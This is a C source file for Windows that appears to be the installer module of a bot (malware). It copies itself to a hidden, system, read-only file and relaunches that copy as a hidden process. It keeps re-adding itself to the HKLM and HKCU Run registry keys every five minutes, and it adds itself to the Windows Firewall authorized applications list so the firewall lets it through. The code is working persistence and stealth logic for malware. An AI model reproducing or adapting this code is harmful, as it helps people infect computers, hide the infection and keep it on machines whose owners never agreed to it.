#include "wALL.h"
char pending;

BOOL MoveBot(char *MTP, char *Bname)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MTP,Bname);
	strcpy(CurrentPath,CurrentPathF);
	char buf3[260],windir[260];
	GetWindowsDirectory(windir,sizeof(windir));
	GetModuleFileName(NULL,buf3,MAX_PATH);
	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != DWORD(-1))
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF,FALSE)) == FALSE)
		{
			DWORD result = GetLastError();
			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE;
				Sleep(15000);
			}
			else
				break;
		}
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		if (bCFRet)
		{
			return TRUE;
		}
	}
	else
	{
	}
	return FALSE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

DWORD WINAPI RegThread(LPVOID myvoid)
{
	HKEY Install;
	char pfad[MAX_PATH];
	char szModule[MAX_PATH];
	GetModuleFileName(0, szModule, sizeof(szModule));

	for( ;; ) {

		if( RegCreateKeyEx( HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL ) == ERROR_SUCCESS ) {
			RegSetValueEx( Install, cfg_regname, 0, REG_SZ, ( unsigned char * )szModule, strlen( szModule ) + 1 );
			RegCloseKey( Install );
		}

		if( RegCreateKeyEx( HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL) == ERROR_SUCCESS ) {
			RegSetValueEx( Install, cfg_regname, 0, REG_SZ, ( unsigned char * )szModule, strlen( szModule ) + 1 );
			RegCloseKey( Install );
		}

		_snprintf( pfad, sizeof( pfad ),"%s:*:Enabled:%s", pfad, cfg_regname );
		if( RegCreateKeyEx( HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL) == ERROR_SUCCESS ) {
			RegSetValueEx( Install, cfg_regname, 0, REG_SZ, ( unsigned char * )szModule, strlen( szModule ) + 1 );
			RegCloseKey( Install );
		}

		Sleep( 5 * 60 * 1000 );
	}
	return 0;
}


/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void BotInstall(void)
{	
	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];
    DWORD		id;

	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(cfg_gotopth,movetopath,sizeof(movetopath));
	sprintf(spath,"%s\\%s",movetopath,cfg_filename);

	if (MoveBot(movetopath,cfg_filename))
	{
        PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;
		if (CreateProcess(spath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL, NULL ,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			WSACleanup();
			ExitProcess(0);
		}

	 ExitProcess(0);
    }
	
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RegThread, 0, 0, &id);
}
		
int Uninstall()
{
	HKEY Remove;

	if( RegCreateKeyEx( HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Remove, NULL ) == ERROR_SUCCESS) {
		RegDeleteValue( Remove, cfg_regname );
		RegCloseKey( Remove );
	}

	if( RegCreateKeyEx( HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Remove, NULL) == ERROR_SUCCESS ) {
		RegDeleteValue( Remove, cfg_regname );
		RegCloseKey( Remove );
	}
	
	if( RegCreateKeyEx( HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Remove, NULL) == ERROR_SUCCESS ) {
		RegDeleteValue( Remove, cfg_regname );
		RegCloseKey( Remove );
	}

	ExitProcess( 0 );

	return 0;
}